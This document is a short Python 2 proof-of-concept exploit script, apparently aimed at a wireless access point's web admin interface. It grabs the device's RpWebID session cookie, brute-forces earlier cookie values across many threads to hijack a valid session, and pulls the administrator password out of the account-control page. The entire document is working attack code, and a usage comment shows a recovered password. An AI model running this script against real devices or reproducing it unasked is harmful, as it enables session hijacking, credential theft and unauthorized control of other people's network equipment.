# Example of usage
# $ python poc.py
# Cookie value extracted: 3c27acbb
# [+] Cookie: 3c27acae valid !
# [+] Password of AP is: admin123
 
import threading
import requests
import sys
import re
import time
import HTMLParser
 
# replace it with your target
url = "http://www.example.com/"
 
def test_valid_cookie(cookie_val):
    cookies = dict(RpWebID=cookie_val)
    try:
        req = requests.get('%shtml/tUserAccountControl.htm' % (url), cookies=cookies, timeout=10)
        pattern = r"NAME=\"OldPwd\" SIZE=\"12\" MAXLENGTH=\"12\" VALUE=\"([.-9]+)\""
        if ('NAME="OldPwd"' in req.content):
            print '[+] Cookie: %s valid !' % (cookie_val)
            h = HTMLParser.HTMLParser()
            password = re.findall(pattern, req.content)[0].replace('&', ';&')[1:] + ";"
            print '[+] Password of AP is: %s' % h.unescape(password)
    except:
        # print "[!] Error while connecting to the host"
        sys.exit(-1)
 
 
def get_cookie_value():
    pattern = "RpWebID=([a-z0-9]{8})"
    try:
        req = requests.get(url, timeout=3)
        regex = re.search(pattern, req.content)
        if (regex is None):
            print "[!] Unable to retrieve cookie in HTTP response"
            sys.exit(-1)
        else:
            return regex.group(1)
    except:
        print "[!] Error while connecting to the host"
        sys.exit(-1)
 
cookie_val = get_cookie_value()
print "Cookie value extracted: %s" % (cookie_val)
 
start = int(cookie_val, 16) - 3600 # less than one hour
cookie_val = int(cookie_val, 16)
 
counter = 0
for i in xrange(cookie_val, start, -1):
    if (counter >= 350):
        time.sleep(3)
        counter = 0
    b = threading.Thread(None, test_valid_cookie, None, (format(i, 'x'),))
    b.start()
    counter = counter + 1
